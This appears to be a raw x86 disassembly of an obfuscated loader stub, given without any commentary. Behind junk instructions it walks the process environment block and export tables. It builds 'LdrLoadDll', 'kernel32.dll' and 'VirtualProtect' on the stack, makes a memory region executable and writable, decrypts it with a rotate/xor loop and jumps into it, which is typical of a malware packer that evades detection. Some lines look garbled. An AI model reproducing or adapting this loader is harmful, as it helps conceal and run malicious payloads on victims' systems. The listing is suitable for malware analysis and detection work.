_start
pushad
push ecx
xor ecx [ esp ]
test edx edx
sbb esp 0xfffffffc
push esp
and edx edx
sbb ecx 0xffffffff
add esp 0x4
mov edx [ esp - 0x4 ]
and esi esi
adc ecx 0x1
and esi esi
sbb edx 0x4
or edx edx
sbb ecx 0xffffffff
neg ecx
call $+5
sub [ edx ] ecx
retn
sub_49f0203c
add esp 0xfffffffc
mov [ esp ] edi
xor edi [ esp ]
test eax eax
adc esp 0x4
mov ecx 0x0
sub ecx edi
neg ecx
add cx 0xffff
add cl 0xff
mov ch cl
and ebp 0x0
or ebp edi
call $+5
and esi esi
mov eax 0x0
adc eax [ esp ]
or eax eax
sbb ebp 0xffffffff
movzx edx [ eax + ebp - 0x2 ]
cmp edx ecx
jne r-xdata
add [ esp ] edi
jmp [ esp ]
sub edi edi
add edi ebp
sub_49f020c4
push [ fs : 0x0 ]
add ebx edx
sub eax eax
add eax 0xffff
not esi
add ebx edx
mov [ fs : 0x0 ] esp
and ebx esi
or ebx ebx
adc ebx edx
jmp r-xdata
call $+5
test ecx ecx
sbb ebx edx
push ecx
xor ecx [ esp ]
test edi edi
sbb esp 0xfffffffc
mov ecx [ ebx ]
mov edi 0x0
add edi 0x5a4d
and ecx eax
push edi
test edi edi
sbb edi ecx
pop edi
je r-xdata
add esp 0x4
mov ecx [ esp - 0x4 ]
or eax eax
mov ecx 0x0
adc ecx [ esp ]
mov [ fs : 0x0 ] ecx
add esp 0x8
xor edx edx
xor edx ebx
test ecx ecx
mov ecx 0x0
adc ecx [ ebx + 0x3c ]
test edi edi
adc ebx ecx
mov ecx 0x0
or ecx 0x4550
xor edi edi
xor edi [ ebx ]
call $+5
mov [ esp ] ecx
sub ecx edi
pop ecx
jne r-xdata
jmp [ esp ]
popad
xor eax eax
add eax 0x1
retn 0xc
and ecx 0x0
or ecx [ ebx + 0x78 ]
and ebx 0x0
add ebx ecx
and eax eax
adc ebx edx
call $+5
mov [ esp ] ebx
and ecx 0x0
add ecx [ ebx + 0x20 ]
test edx edx
mov ebx 0x0
adc ebx ecx
or ebx ebx
adc ebx edx
sub esp 0x4
mov [ esp ] edx
add esp 0xfffffffc
mov [ esp ] ebx
add esp 0x4
mov esi [ esp - 0x4 ]
pop ebx
sub esp 0x4
mov [ esp ] edx
xor edx [ esp ]
test edx edx
adc esp 0x4
push esi
pop eax
sub ecx ecx
add ecx [ esi ]
xor esi esi
add esi ecx
call $+5
and ebp 0x0
add ebp esp
add esi ebx
sub esp 0x4
mov [ esp ] 0x6c6c
sub esp 0x4
mov [ esp ] 0x4464616f
add esp 0xfffffffc
mov [ esp ] 0x4c72644c
sub edi edi
add edi esp
mov ecx 0x0
xor ecx 0xb
[ esi ] [ edi ]
je r-xdata
and esp 0x0
or esp ebp
pop esi
push ebx
push edx
mov esi [ esp ]
add esp 0x4
add esp 0x4
mov edx [ esp - 0x4 ]
pop ebx
xor eax eax
or eax ebx
mov ecx 0x0
xor ecx [ ebx + 0x24 ]
mov ebx 0x0
xor ebx ecx
test edx edx
adc ebx edx
and ecx 0x0
add ecx [ ebx + esi * 2 ]
and ecx 0xffff
mov esi 0x0
xor esi ecx
xor ecx ecx
or ecx [ eax + 0x10 ]
sub esi ecx
and ecx ecx
adc esi 0x1
or edx edx
mov ebx 0x0
adc ebx [ eax + 0x1c ]
and eax eax
adc ebx edx
and ecx 0x0
or ecx [ ebx + esi * 4 ]
test eax eax
adc edx ecx
xor ebp ebp
add ebp esp
call $+5
mov [ esp ] ecx
xor ecx [ esp ]
add esp 0x4
call $+5
mov [ esp ] ecx
xor ebx ebx
or ebx esp
push ecx
call $+5
mov [ esp ] 0x6c006c
push 0x64002e
sub esp 0x4
mov [ esp ] 0x320033
sub esp 0x4
mov [ esp ] 0x6c0065
add esp 0xfffffffc
mov [ esp ] 0x6e0072
call $+5
mov [ esp ] 0x65006b
push esp
call $+5
mov [ esp ] 0x1a0018
xor edi edi
add edi esp
add esp 0xfffffffc
mov [ esp ] ebx
call $+5
mov [ esp ] edi
sub esp 0x4
mov [ esp ] ecx
push ecx
call $+5
mov [ esp ] edx
sub esp 0x4
mov [ esp ] ebx
add esp 0x4
mov esi [ esp - 0x4 ]
mov ebx [ esp ]
add esp 0x4
call ebx
xor eax eax
or eax [ esi ]
call $+5
mov [ esp ] eax
mov ecx [ esp ]
add esp 0x4
sub edi edi
add edi [ fs : 0x30 ]
mov edx 0x0
or edx [ edi + 0x10 ]
mov [ edx + 0x18 ] ecx
xor esp esp
add esp ebp
and edi 0x0
or edi [ fs : 0x30 ]
mov edx 0x0
sub edx [ edi + 0x10 ]
neg edx
xor ebx ebx
or ebx [ edx + 0x18 ]
xor edx edx
add edx ebx
mov ecx 0x0
xor ecx [ ebx + 0x3c ]
test ecx ecx
adc ebx ecx
mov ecx 0x0
add ecx [ ebx + 0x78 ]
mov ebx 0x0
xor ebx ecx
and eax eax
adc ebx edx
sub esp 0x4
mov [ esp ] ebx
mov ecx 0x0
xor ecx [ ebx + 0x20 ]
mov ebx 0x0
xor ebx ecx
and edx edx
adc ebx edx
push edx
sub esp 0x4
mov [ esp ] ebx
pop esi
mov ebx [ esp ]
add esp 0x4
sub esp 0x4
mov [ esp ] edx
xor edx [ esp ]
add esp 0x4
push esi
pop eax
mov ecx [ esi ]
mov esi ecx
call $+5
xor ebp ebp
xor ebp esp
add esi ebx
sub esp 0x4
mov [ esp ] 0x7463
add esp 0xfffffffc
mov [ esp ] 0x65746f72
add esp 0xfffffffc
mov [ esp ] 0x506c6175
call $+5
mov [ esp ] 0x74726956
xor edi edi
or edi esp
mov ecx 0x0
xor ecx 0xf
[ esi ] [ edi ]
je r-xdata
inc edx
add eax 0x4
mov esi 0x0
or esi [ eax ]
sub esp esp
add esp ebp
jmp [ esp ]
xor esp esp
or esp ebp
pop esi
sub esp 0x4
mov [ esp ] ebx
call $+5
mov [ esp ] edx
pop esi
pop edx
add esp 0x4
mov ebx [ esp - 0x4 ]
and eax 0x0
add eax ebx
xor ecx ecx
xor ecx [ ebx + 0x24 ]
mov ebx 0x0
sub ebx ecx
neg ebx
test ecx ecx
adc ebx edx
xor ecx ecx
add ecx [ ebx + esi * 2 ]
and ecx 0xffff
mov esi 0x0
add esi ecx
mov ecx 0x0
or ecx [ eax + 0x10 ]
test edi edi
sbb esi ecx
inc esi
mov ebx 0x0
xor ebx [ eax + 0x1c ]
add ebx edx
xor ecx ecx
add ecx [ ebx + esi * 4 ]
test ebx ebx
adc edx ecx
or ecx ecx
mov eax 0x0
adc eax 0x1000
call $+5
add esp 0x4
mov ebx [ esp - 0x4 ]
and ebx 0xfffff000
add ebx eax
add ebx eax
call $+5
mov [ esp ] ebx
test edi edi
mov edi 0x0
adc edi 0x4
call $+5
add ebx eax
xor ecx ecx
xor ecx [ ebx ]
stc
sbb edi 0x0
je r-xdata
or ebx ebx
sbb edx 0xffffffff
and edi edi
adc eax 0x4
mov esi [ eax ]
sub esp esp
add esp ebp
jmp [ esp ]
add esp 0x4
mov ecx [ esp - 0x4 ]
pop ebx
push ecx
push esp
add esp 0xfffffffc
mov [ esp ] 0x40
sub esp 0x4
mov [ esp ] 0x45c2
call $+5
mov [ esp ] ebx
call $+5
mov [ esp ] edx
sub esp 0x4
mov [ esp ] ebx
pop esi
add esp 0x4
mov ebx [ esp - 0x4 ]
call $+5
pop eax
add eax 0x17
push eax
sub esp 0x4
mov [ esp ] ebp
and ebp 0x0
or ebp esp
or ebx ebx
adc ebx 0x5
jmp ebx
jmp [ esp ]
sub_49f02534
add esp 0x4
mov ebx [ esp - 0x4 ]
test edi edi
mov edi 0x0
adc edi esi
mov eax 0xc
test eax eax
adc edi eax
and esi 0x0
add esi edi
mov ebp 0x0
sub ebp edi
neg ebp
mov ecx 0x0
xor ecx 0x4520
and edx 0x0
add edx ecx
call $+5
mov eax 0x0
add eax [ esi ]
rol al cl
push edx
xor eax [ esp ]
test eax eax
sbb esp 0xfffffffc
push ecx
mov ecx 0x0
add ecx 0x40
cmp ebx ecx
je r-xdata
test eax eax
adc esi 0x1
add esp 0x4
mov ecx [ esp - 0x4 ]
add ecx 0xffffffff
je r-xdata
stosb [ edi ]
mov eax [ esp ]
add esp 0x4
call ebp
add eax ebx
add ecx edx
popad
xor eax eax
add eax 0x1
retn 0xc
jmp [ esp ]
